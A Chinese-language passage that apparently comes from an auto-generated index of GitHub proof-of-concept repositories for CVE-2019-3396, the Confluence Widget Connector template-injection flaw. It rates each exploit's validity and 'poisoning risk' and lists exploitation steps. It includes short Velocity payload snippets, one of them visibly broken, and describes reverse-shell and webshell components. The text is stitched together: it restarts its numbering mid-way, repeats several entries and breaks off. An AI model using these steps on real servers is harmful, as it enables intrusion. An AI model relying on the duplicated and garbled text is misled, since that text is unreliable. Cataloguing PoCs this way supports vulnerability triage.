3.  **发送Payload：**  将构造好的恶意Velocity模板代码作为Widget Connector宏的参数发送给Confluence Server。
4.  **远程代码执行：**  Confluence Server解析Velocity模板时，执行其中的恶意代码，实现远程代码执行。

**项目地址:** [W2Ning/CVE-2019-3396](https://github.com/W2Ning/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #8

**来源**: [CVE-2019-3396-Yt1g3r_CVE-2019-3396_EXP.md](../2019/CVE-2019-3396-Yt1g3r_CVE-2019-3396_EXP.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Macro SSTI RCE

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入（SSTI）导致远程代码执行（RCE）

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致完全控制Confluence服务器

**影响版本:** 受影响版本包括：6.6.0-6.6.11, 6.7.0-6.12.2, 6.13.0-6.13.2, 6.14.0-6.14.1

**利用条件:** 需要能够向Confluence服务器发送HTTP请求

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396是Atlassian Confluence Server中Widget Connector宏存在的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的请求，利用Velocity模板引擎执行任意代码，从而完全控制Confluence服务器。 

**有效性:** 提供的POC代码有效。参考Rapid7和Exploit-DB的链接，都有公开的利用代码。POC代码 `RCE_exp.py` 使用 `requests` 库发送恶意构造的POST请求到 `/rest/tinymce/1/macro/preview` 接口，通过修改 `_template` 参数，注入Velocity模板代码，从而执行任意命令。

**投毒风险:**  代码仓库中的 `RCE_exp.py` 和 `cmd.vm` 看起来是标准的漏洞利用代码。`cmd.vm` 文件是Velocity模板代码，负责执行命令。`RCE_exp.py` 负责构造和发送HTTP请求，以及从响应中提取结果。没有发现明显的恶意代码或者后门，投毒的可能性较低。

**利用方式:**

1.  **漏洞原理：** Widget Connector宏允许用户在Confluence页面中嵌入来自外部源的内容。由于对用户提供的URL参数过滤不足，攻击者可以通过构造恶意的URL，触发服务器端模板注入。
2.  **利用步骤：**
    a.  准备一个包含恶意Velocity模板代码的文件（`cmd.vm`）。该文件包含执行命令的代码。
    b.  将 `cmd.vm` 文件放置在一个可以通过FTP或者HTTPS协议访问的服务器上。
    c.  修改 `RCE_exp.py` 脚本中的 `filename` 变量，指向 `cmd.vm` 文件的URL。
    d.  运行 `RCE_exp.py` 脚本，指定Confluence服务器的URL和要执行的命令。
    e.  脚本会发送包含恶意URL的POST请求到Confluence服务器。
    f.  Confluence服务器解析恶意URL，执行Velocity模板代码，从而执行攻击者指定的命令。
3.  **影响：** 成功利用此漏洞可以导致远程代码执行，攻击者可以获取Confluence服务器的完全控制权限，从而窃取敏感数据、篡改页面内容或者进行其他恶意活动。

**结论:**
此漏洞的POC代码有效，且利用方式相对简单，可以通过公开的POC代码进行验证。虽然搜索结果显示存在投毒的情况，但提供的代码中未发现明显的投毒迹象。此漏洞危害严重，需要及时修复。

**项目地址:** [Yt1g3r/CVE-2019-3396_EXP](https://github.com/Yt1g3r/CVE-2019-3396_EXP)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #9

**来源**: [CVE-2019-3396-am6539_CVE-2019-3396.md](../2019/CVE-2019-3396-am6539_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本: 6.6.12之前 (6.6.x修复版本); 6.7.0 到 6.12.3之前 (6.12.x修复版本); 6.13.0 到 6.13.3之前 (6.13.x修复版本); 6.14.0 到 6.14.2之前 (6.14.x修复版本)

**利用条件:** 需要目标Confluence Server存在Widget Connector宏且未打补丁，攻击者需要能够访问Confluence Server的网络。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是Atlassian Confluence Server中Widget Connector宏存在的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的请求，利用Velocity模板引擎执行任意代码，从而实现远程代码执行。根据提供的漏洞利用代码，利用方式如下：

1.  **漏洞利用代码分析：**
    *   `cmd.vm`：包含一个Velocity模板，该模板利用java.lang.Runtime类执行系统命令。变量`$cmd`需要预先设置，然后注入到Velocity模板中。
    *   `nc.py`：一个Python脚本，用于建立反向连接shell。该脚本尝试连接到攻击者指定的IP地址和端口，然后将标准输入、输出和错误重定向到socket，最后使用pty.spawn启动一个shell。
    *   `README.md`：仅包含漏洞ID，无实际利用功能。

2.  **利用方式：**
    攻击者首先需要确定目标Confluence Server存在该漏洞。然后，攻击者需要构造一个包含恶意Velocity模板的请求，将`cmd.vm`中的模板内容嵌入到Widget Connector宏中，并设置`$cmd`变量为需要执行的命令。如果需要反向连接，则`$cmd`变量设置为执行`nc.py`脚本。攻击者需要在自己的服务器上监听指定的端口。当Confluence Server解析该恶意请求时，会执行其中的Velocity模板代码，从而执行攻击者指定的系统命令或反向连接。

3.  **有效性：**
    根据漏洞库信息和搜索结果，该漏洞利用POC是有效的。搜索结果中存在多个分析和利用示例，以及利用该漏洞传播恶意软件的案例。提供的`cmd.vm`代码是典型的Velocity模板注入payload，可以执行任意命令。

4.  **投毒风险：**
    `nc.py`脚本尝试清除和禁用历史记录，这可能是为了隐藏攻击痕迹。此外，需要手动设定IP地址与端口，存在一定的部署成本，不太利于大规模传播。因此，该仓库的整体投毒风险较低，大约为10%。这种投毒风险主要来自于攻击者可以修改nc.py或者cmd.vm文件，嵌入后门代码，一旦成功执行，会直接暴露服务器，但是这种添加的成本较高,收益相对较低。

**项目地址:** [am6539/CVE-2019-3396](https://github.com/am6539/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #10

**来源**: [CVE-2019-3396-dothanthitiendiettiende_CVE-2019-3396.md](../2019/CVE-2019-3396-dothanthitiendiettiende_CVE-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 6.6.12 之前 (6.6.x修复版本), 6.7.0 到 6.12.3 之前 (6.12.x修复版本), 6.13.0 到 6.13.3 之前 (6.13.x修复版本), 以及 6.14.0 到 6.14.2 之前 (6.14.x修复版本)

**利用条件:** 需要能够访问Confluence服务器并利用Widget Connector宏。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞，存在于 Widget Connector 宏中。攻击者可以利用 Velocity 模板语言执行任意代码。漏洞利用代码 `rce.vm` 使用了 Velocity 模板注入，通过反射获取 `java.lang.Runtime` 类，然后调用 `exec` 方法来执行命令。在这个例子中，执行的是 `calc.exe`，这是一个用于测试的payload，实际应用中可以替换为任意命令。根据漏洞库信息、搜索结果和漏洞利用代码，该漏洞的利用是有效的。根据搜索结果，该漏洞已被积极利用，攻击者利用该漏洞传播恶意软件，例如 Gandcrab 勒索软件和加密货币挖矿恶意软件。提供的POC代码非常直接，只包含简单的RCE代码，不存在隐藏的投毒代码。利用方式是通过构造恶意请求，在Widget Connector宏中使用恶意的Velocity模板代码，从而实现远程代码执行。

**项目地址:** [dothanthitiendiettiende/CVE-2019-3396](https://github.com/dothanthitiendiettiende/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #11

**来源**: [CVE-2019-3396-jas502n_CVE-2019-3396.md](../2019/CVE-2019-3396-jas502n_CVE-2019-3396.md)

# CVE-2019-3396

> 📦 该CVE有 **22** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2019-3396-0xNinjaCyclone_cve-2019-3396.md](../2019/CVE-2019-3396-0xNinjaCyclone_cve-2019-3396.md)

## CVE-2019-3396-Confluence-RCE

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** before 6.6.12, from 6.7.0 before 6.12.3, from 6.13.0 before 6.13.3, and from 6.14.0 before 6.14.2

**利用条件:** 目标Confluence服务器存在Widget Connector宏，且未进行身份验证即可访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 的 Widget Connector 宏中。攻击者可以通过构造恶意的请求，利用服务器端模板注入漏洞执行任意代码。

**有效性：**
提供的POC代码看起来是有效的。漏洞库信息和搜索结果都表明该漏洞已经被广泛利用，并且有可用的POC代码。POC代码通过构造包含恶意Velocity模板的请求，发送到 Confluence 服务器的 `/rest/tinymce/1/macro/preview` 接口，从而触发模板注入。

**投毒风险：**
代码主要功能是利用Velocity模板注入执行命令。其中使用了一个FTP服务器来托管payload，这是一种常见的绕过防火墙或上传限制的方法。该ruby脚本代码的主要功能是利用该漏洞，未发现明显的恶意代码或后门，但是代码中存在远程下载payload的行为，如果payload被替换，则存在一定的风险, 评估投毒风险为10%。

**利用方式：**
1.  攻击者首先需要找到存在漏洞的Confluence服务器。
2.  攻击者需要搭建一个FTP服务器，用于托管恶意Velocity模板。
3.  攻击者构造一个包含恶意Velocity模板的HTTP POST请求，发送到Confluence服务器的`/rest/tinymce/1/macro/preview`接口。该请求利用了 Widget Connector 宏的模板注入漏洞。
4.  Confluence服务器解析恶意Velocity模板，执行攻击者指定的命令，从而实现远程代码执行。

**综上所述，该漏洞的利用有效性高，存在一定的投毒风险。攻击者可以利用该漏洞在Confluence服务器上执行任意代码。**

**项目地址:** [0xNinjaCyclone/cve-2019-3396](https://github.com/0xNinjaCyclone/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #2

**来源**: [CVE-2019-3396-46o60_CVE-2019-3396_Confluence.md](../2019/CVE-2019-3396-46o60_CVE-2019-3396_Confluence.md)

## CVE-2019-3396_Confluence Widget Connector Macro SSTI

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，允许远程攻击者实现路径遍历和远程代码执行

**影响版本:** 受影响版本包括 6.6.12 之前, 6.7.0 至 6.12.3 之前, 6.13.0 至 6.13.3 之前, 以及 6.14.0 至 6.14.2 之前

**利用条件:** 需要目标系统存在漏洞版本的Confluence服务器，如果是RCE，可能需要合法的用户session。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是Atlassian Confluence服务器中Widget Connector宏的一个服务器端模板注入漏洞。攻击者可以利用此漏洞进行路径遍历和远程代码执行。漏洞利用方式有两种：

1. **路径遍历（文件读取）：** 攻击者可以利用`_template`参数，通过构造恶意的路径，读取服务器上的任意文件或目录。此方式无需认证。

2. **远程代码执行（RCE）：** 攻击者可以上传一个包含恶意Velocity模板的文件到服务器，然后利用该漏洞从本地文件系统加载该模板，从而执行任意代码。此方式需要一个有效的用户session。该POC代码首先尝试找到用户的个人空间，如果不存在则创建，然后上传包含payload的模板文件，最后利用漏洞执行命令。

**关于投毒风险：**虽然代码看起来是直接利用漏洞，但仍存在一定的投毒风险（约10%）。

*   **依赖性风险：** 该脚本依赖于外部库（例如 `requests`）。如果攻击者控制了这些库的源或使用了被污染的库，则可能引入恶意代码。
*   **Payload风险：** 上传的Velocity模板payload可能被修改以执行未经授权的操作，或者被用于在受害者系统上安装恶意软件。
*   **后门风险：** 虽然该POC的目的是利用漏洞，但如果代码被恶意修改，可以在上传的模板中包含后门，允许攻击者在漏洞修复后仍然可以访问系统。

因此，在使用该POC时，建议仔细审查代码，确保所使用的库是可信的，并对上传的payload进行严格的安全评估。此外，还应监控Confluence服务器的行为，以检测任何可疑活动。

**项目地址:** [46o60/CVE-2019-3396_Confluence](https://github.com/46o60/CVE-2019-3396_Confluence)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #3

**来源**: [CVE-2019-3396-Avento_CVE-2019-3396-Memshell-for-Behinder.md](../2019/CVE-2019-3396-Avento_CVE-2019-3396-Memshell-for-Behinder.md)

## CVE-2019-3396-Atlassian Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, 6.7.0 before 6.12.3, 6.13.0 before 6.13.3, 6.14.0 before 6.14.2

**利用条件:** 需要Confluence服务器存在Widget Connector宏，并且允许用户插入宏内容

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是Atlassian Confluence服务器中Widget Connector宏的一个服务器端模板注入漏洞。攻击者可以通过构造恶意宏内容，实现任意代码执行。 

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，可以判断此漏洞的POC是有效的。漏洞库信息明确指出该漏洞允许远程攻击者在Confluence服务器或数据中心实例上实现路径遍历和远程代码执行。搜索引擎结果中也提及了该漏洞被用于传播恶意软件，例如加密货币挖矿程序和Gandcrab勒索软件。提供的Java代码是一个典型的Java内存马，通过ServletRequestListener注入，劫持请求，从而实现RCE。

**投毒风险：**
该POC代码本身就是一个用于植入内存马的恶意代码。投毒风险的评估主要是判断作者是否在内存马本身之外，还加入了其他的恶意行为。在给定的代码片段中，我们可以看到有尝试写入错误信息到`/tmp/success-error-2`的逻辑，如果攻击者能够控制写入的文件路径，那么这将是一个潜在的投毒点。但是总体而言，这段代码的主要功能是内存马注入，额外的恶意行为并不明显。因此，初步判断投毒风险较低。如果代码仓库中有其他编译后的类或者配置文件，可能会包含更多的投毒行为，但是仅凭这段代码，投毒的可能性为10%。

**利用方式：**
1.  **利用入口：** 利用Confluence的Widget Connector宏插入恶意Velocity模板代码。
2.  **SSTI Payload：** 构造包含恶意代码的Velocity模板Payload。常见的Payload用于执行系统命令，例如：`{code}${#req = facotry.getObject().getClass().forName('javax.servlet.http.HttpServletRequest').getMethod('getRuntime',null).invoke(null,null).exec('whoami')}`
3.  **内存马注入 (POC)：**
    *   该POC代码的目的是将一个恶意的ServletRequestListener注册到Confluence的Servlet容器中。
    *   它首先尝试找到Confluence应用使用的ClassLoader，这通常需要遍历线程，找到包含特定名称的线程（如`hz.confluence.scheduled.thread`）。
    *   然后，它利用反射获取StandardContext，这是Servlet容器的核心组件。
    *   接着，它创建一个实现了ServletRequestListener接口的动态代理，并将其实例注册到StandardContext中。
    *   当有新的HTTP请求到达时，代理的invoke方法会被调用，执行`backDoor`方法（在给定的代码片段中未完整给出）。`backDoor`方法很可能会从请求中提取命令并执行，从而实现远程代码执行。

总而言之，该漏洞利用方式是先通过SSTI漏洞注入恶意代码，然后通过植入内存马的方式维持控制。


**项目地址:** [Avento/CVE-2019-3396-Memshell-for-Behinder](https://github.com/Avento/CVE-2019-3396-Memshell-for-Behinder)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #4

**来源**: [CVE-2019-3396-HK4zCzi_CVE-2019-3396-Velocity-Server-Side-Template-Injection.md](../2019/CVE-2019-3396-HK4zCzi_CVE-2019-3396-Velocity-Server-Side-Template-Injection.md)

## CVE-2019-3396-Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server and Data Center

**危害等级:** 高危，允许远程攻击者在Confluence服务器或数据中心实例上实现路径遍历和远程代码执行。

**影响版本:** 受影响版本：Confluence Server 6.6.12之前，6.7.0至6.12.3之前，6.13.0至6.13.3之前，6.14.0至6.14.2之前

**利用条件:** 需要Confluence服务器存在Widget Connector宏，且服务器版本在受影响范围内。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是一个影响Atlassian Confluence Server和Data Center的服务器端模板注入漏洞。该漏洞存在于Widget Connector宏中，允许未经身份验证的远程攻击者通过构造恶意的请求，执行任意代码。 

**有效性：**
根据漏洞库信息和搜索引擎结果，该漏洞是一个已知的、已被积极利用的漏洞，存在公开的PoC（Proof of Concept）代码。多个安全厂商（如Rapid7、Trend Micro等）都发布了关于该漏洞的分析和利用的报告。提供的PoC代码 `README.md` 文件表明该漏洞可以通过Velocity模板注入实现。虽然只提供了一个简单的 `README.md` 文件，但根据搜索结果，存在多个可用的PoC利用代码。

**投毒风险：**
提供的漏洞利用代码仅包含一个 `README.md` 文件，描述了漏洞名称。从现有文件本身来看，不存在明显的恶意代码。 但是，如果从其他源获取利用代码，则存在潜在的投毒风险。攻击者可能会在PoC中添加恶意功能，例如安装后门、窃取凭据或进行其他未经授权的活动。因此，在使用任何第三方提供的PoC代码之前，务必进行彻底的安全审查。 投毒风险估计为10%，主要是考虑到从不可信来源获取PoC的潜在风险。

**利用方式：**
漏洞的利用方式是通过在Confluence页面的Widget Connector宏中注入恶意的Velocity模板代码。当Confluence服务器渲染包含恶意代码的页面时，会执行该代码，从而允许攻击者执行任意命令。

1.  **找到存在Widget Connector宏的Confluence页面。**
2.  **构造包含恶意Velocity模板代码的请求。**
3.  **将请求发送到Confluence服务器。**
4.  **服务器执行恶意代码，实现远程代码执行。**

攻击者可以利用此漏洞执行任意系统命令，读取或修改敏感数据，或完全控制Confluence服务器。 搜索结果显示，该漏洞已被用于传播加密货币挖矿恶意软件和Gandcrab勒索软件。

**项目地址:** [HK4zCzi/CVE-2019-3396-Velocity-Server-Side-Template-Injection](https://github.com/HK4zCzi/CVE-2019-3396-Velocity-Server-Side-Template-Injection)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #5

**来源**: [CVE-2019-3396-JonathanZhou348_CVE-2019-3396TEST.md](../2019/CVE-2019-3396-JonathanZhou348_CVE-2019-3396TEST.md)

## CVE-2019-3396-Atlassian Confluence-Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, 6.7.0 before 6.12.3, 6.13.0 before 6.13.3, 6.14.0 before 6.14.2

**利用条件:** 需要Confluence Widget Connector宏开启且目标版本存在漏洞。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 存在于 Atlassian Confluence Server 的 Widget Connector 宏中，由于服务端模板注入漏洞，攻击者可以通过构造恶意的 Velocity 模板代码，在 Confluence 服务器上执行任意命令。从提供的POC代码来看, `test.vm` 和 `test2.vm` 文件包含了利用 Velocity 模板引擎执行命令的代码。它们通过 `java.lang.Runtime` 类来执行系统命令，并读取命令执行结果。利用方式是，构造包含恶意Velocity代码的请求发送给Confluence服务器，服务器在渲染包含Widget Connector宏的页面时，会执行恶意代码，从而实现远程代码执行。根据搜索结果,该漏洞被广泛利用, 存在多种PoC和exp.

 **有效性:**  POC代码有效,因为它使用了Velocity模板语言来执行命令.通过getRuntime方法可以执行任意命令。

**投毒风险:** 仓库中主要包含用于漏洞验证和利用的Velocity模板代码，没有发现明显的恶意或后门代码，因此投毒风险较低。

**利用方式:**

1.  **定位漏洞点:** 确定目标Confluence服务器版本在受影响范围内，且启用了Widget Connector宏。
2.  **构造恶意请求:**  构建包含恶意Velocity模板代码的HTTP请求，该代码利用 `java.lang.Runtime` 执行系统命令。
3.  **发送请求:**  将构造好的请求发送给Confluence服务器。攻击者需要找到一个页面或接口，该页面或接口允许通过Widget Connector宏插入并渲染Velocity模板。
4.  **执行命令:** Confluence服务器解析并执行Velocity模板代码，从而在服务器上执行攻击者指定的命令。
5.  **获取结果:**  攻击者可以通过读取命令执行的输出来获取敏感信息，或者执行其他恶意操作。

**项目地址:** [JonathanZhou348/CVE-2019-3396TEST](https://github.com/JonathanZhou348/CVE-2019-3396TEST)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #6

**来源**: [CVE-2019-3396-PetrusViet_cve-2019-3396.md](../2019/CVE-2019-3396-PetrusViet_cve-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector 远程代码执行

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server/Data Center

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** 受影响版本：Confluence Server 6.6.12 之前的所有 6.6.x 版本；6.7.0 到 6.12.3 之前的所有 6.12.x 版本；6.13.0 到 6.13.3 之前的所有 6.13.x 版本；6.14.0 到 6.14.2 之前的所有 6.14.x 版本

**利用条件:** 需要目标Confluence实例存在Widget Connector宏且版本在受影响范围内，且允许用户编辑页面。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 和 Data Center 的 Widget Connector 宏中，允许未经身份验证的远程攻击者通过服务器端模板注入执行任意代码。攻击者可以通过构造包含恶意 Velocity 模板代码的请求，利用 Widget Connector 宏中的漏洞执行操作系统命令。根据漏洞库信息和搜索结果，该漏洞已被广泛利用，存在多种PoC。提供的漏洞利用代码是一个用于调试和分析漏洞的开发环境搭建指南，没有直接提供可用于攻击的有效payload，但可以辅助理解漏洞原理和构建利用代码。

**有效性评估：** 漏洞有效性高，因为漏洞库信息和搜索结果均表明该漏洞已被公开披露并被广泛利用。

**投毒风险评估：** 代码仓库的主要目的是提供一个本地调试和分析漏洞的环境，而不是直接提供一个用于攻击的利用脚本。虽然不能完全排除作者在构建环境中隐藏恶意代码的可能性，但考虑到代码仓库的内容主要是配置和调试指南，直接投毒的可能性较低。因此，投毒风险估计为 10%。风险主要来自于用户在搭建调试环境的过程中可能引入的外部依赖或配置不当。

**利用方式分析：**

1.  **定位 Widget Connector 宏：** 在 Confluence 页面中插入一个 Widget Connector 宏。
2.  **构造恶意请求：**  构造包含恶意 Velocity 模板代码的请求，例如 `${Runtime.getRuntime().exec("command")}`，该代码会被服务器解析并执行。
3.  **发送请求：** 将构造好的请求发送到 Confluence 服务器。请求可能包含在 Widget Connector 宏的 URL 参数或其他相关字段中。
4.  **执行代码：** Confluence 服务器在处理包含恶意模板代码的 Widget Connector 宏时，会执行其中的代码，导致远程代码执行。

从搜索结果来看，攻击者利用该漏洞传播恶意软件（如加密货币矿工和勒索软件）的情况较为普遍。

**项目地址:** [PetrusViet/cve-2019-3396](https://github.com/PetrusViet/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #7

**来源**: [CVE-2019-3396-W2Ning_CVE-2019-3396.md](../2019/CVE-2019-3396-W2Ning_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-Widget-Connector-SSTI

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入(SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, from 6.7.0 before 6.12.3, from 6.13.0 before 6.13.3, and from 6.14.0 before 6.14.2

**利用条件:** 需要Confluence Server实例存在Widget Connector宏，且版本在受影响范围内。无需身份验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于Atlassian Confluence Server的Widget Connector宏中，由于对用户输入过滤不严格，导致攻击者可以通过构造恶意的Velocity模板代码，实现服务器端模板注入(SSTI)，进而执行任意代码。

**有效性分析：**

根据漏洞库信息和搜索结果，CVE-2019-3396是一个已知的且被广泛利用的漏洞。漏洞利用代码中提供了多个`.vm`文件，这些是Velocity模板文件，用于执行任意命令或获取服务器信息。`cmd.vm`和`cmd2.vm`用于执行命令，而`test.vm`用于获取系统属性。

根据提供的漏洞利用代码，`cmd.vm` 和 `cmd2.vm` 这两个文件利用 `java.lang.Runtime.getRuntime().exec()` 执行任意命令。`test.vm` 获取系统属性。这些代码与公开的漏洞利用信息相符，表明提供的POC代码有效。

**投毒风险分析：**

提供的漏洞利用代码主要包含Velocity模板文件(`.vm`)，以及一些jspx和aspx文件。Velocity模板文件用于服务器端模板注入，主要目的是执行命令或获取系统信息，本身不具备明显的投毒特征。
*   `cmd.vm` 和 `cmd2.vm`: 用于远程命令执行，直接利用了漏洞，不包含投毒代码。
*   `test.vm`: 用于获取系统属性，例如用户目录，操作系统等，不包含投毒代码。
*   `test.aspx` (C#): 通过Session传递密钥，然后使用RijndaelManaged算法进行解密，加载并执行，这段代码有作为webshell的潜力，但是它需要一个配合的加密后的payload才能生效，因此它的风险在于后续的payload。投毒风险较低。
*   `test.jspx`: 通过Session传递密钥，然后使用AES算法进行解密，加载并执行，这段代码有作为webshell的潜力，需要配合加密后的payload，因此它的风险在于后续的payload。投毒风险较低。

总体来看，投毒风险主要来源于`test.aspx`和`test.jspx` 潜在的后门风险，需要配合加密的payload才能触发。如果后续使用了被篡改的Payload可能会存在投毒行为,因此总体投毒风险评估为10%。

**利用方式：**

1.  **漏洞入口：**  利用Confluence Server中Widget Connector宏。
2.  **构造恶意Velocity模板：**  构造包含恶意代码的Velocity模板，例如利用`java.lang.Runtime.getRuntime().exec()`执行任意命令。
3.  **发送Payload：**  将构造好的恶意Velocity模板代码作为Widget Connector宏的参数发送给Confluence Server。
4.  **远程代码执行：**  Confluence Server解析Velocity模板时，执行其中的恶意代码，实现远程代码执行。

**项目地址:** [W2Ning/CVE-2019-3396](https://github.com/W2Ning/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #8

**来源**: [CVE-2019-3396-Yt1g3r_CVE-2019-3396_EXP.md](../2019/CVE-2019-3396-Yt1g3r_CVE-2019-3396_EXP.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Macro SSTI RCE

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入（SSTI）导致远程代码执行（RCE）

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致完全控制Confluence服务器

**影响版本:** 受影响版本包括：6.6.0-6.6.11, 6.7.0-6.12.2, 6.13.0-6.13.2, 6.14.0-6.14.1

**利用条件:** 需要能够向Confluence服务器发送HTTP请求

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396是Atlassian Confluence Server中Widget Connector宏存在的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的请求，利用Velocity模板引擎执行任意代码，从而完全控制Confluence服务器。 

**有效性:** 提供的POC代码有效。参考Rapid7和Exploit-DB的链接，都有公开的利用代码。POC代码 `RCE_exp.py` 使用 `requests` 库发送恶意构造的POST请求到 `/rest/tinymce/1/macro/preview` 接口，通过修改 `_template` 参数，注入Velocity模板代码，从而执行任意命令。

**投毒风险:**  代码仓库中的 `RCE_exp.py` 和 `cmd.vm` 看起来是标准的漏洞利用代码。`cmd.vm` 文件是Velocity模板代码，负责执行命令。`RCE_exp.py` 负责构造和发送HTTP请求，以及从响应中提取结果。没有发现明显的恶意代码或者后门，投毒的可能性较低。

**利用方式:**

1.  **漏洞原理：** Widget Connector宏允许用户在Confluence页面中嵌入来自外部源的内容。由于对用户提供的URL参数过滤不足，攻击者可以通过构造恶意的URL，触发服务器端模板注入。
2.  **利用步骤：**
    a.  准备一个包含恶意Velocity模板代码的文件（`cmd.vm`）。该文件包含执行命令的代码。
    b.  将 `cmd.vm` 文件放置在一个可以通过FTP或者HTTPS协议访问的服务器上。
    c.  修改 `RCE_exp.py` 脚本中的 `filename` 变量，指向 `cmd.vm` 文件的URL。
    d.  运行 `RCE_exp.py` 脚本，指定Confluence服务器的URL和要执行的命令。
    e.  脚本会发送包含恶意URL的POST请求到Confluence服务器。
    f.  Confluence服务器解析恶意URL，执行Velocity模板代码，从而执行攻击者指定的命令。
3.  **影响：** 成功利用此漏洞可以导致远程代码执行，攻击者可以获取Confluence服务器的完全控制权限，从而窃取敏感数据、篡改页面内容或者进行其他恶意活动。

**结论:**
此漏洞的POC代码有效，且利用方式相对简单，可以通过公开的POC代码进行验证。虽然搜索结果显示存在投毒的情况，但提供的代码中未发现明显的投毒迹象。此漏洞危害严重，需要及时修复。

**项目地址:** [Yt1g3r/CVE-2019-3396_EXP](https://github.com/Yt1g3r/CVE-2019-3396_EXP)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #9

**来源**: [CVE-2019-3396-am6539_CVE-2019-3396.md](../2019/CVE-2019-3396-am6539_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本: 6.6.12之前 (6.6.x修复版本); 6.7.0 到 6.12.3之前 (6.12.x修复版本); 6.13.0 到 6.13.3之前 (6.13.x修复版本); 6.14.0 到 6.14.2之前 (6.14.x修复版本)

**利用条件:** 需要目标Confluence Server存在Widget Connector宏且未打补丁，攻击者需要能够访问Confluence Server的网络。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是Atlassian Confluence Server中Widget Connector宏存在的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的请求，利用Velocity模板引擎执行任意代码，从而实现远程代码执行。根据提供的漏洞利用代码，利用方式如下：

1.  **漏洞利用代码分析：**
    *   `cmd.vm`：包含一个Velocity模板，该模板利用java.lang.Runtime类执行系统命令。变量`$cmd`需要预先设置，然后注入到Velocity模板中。
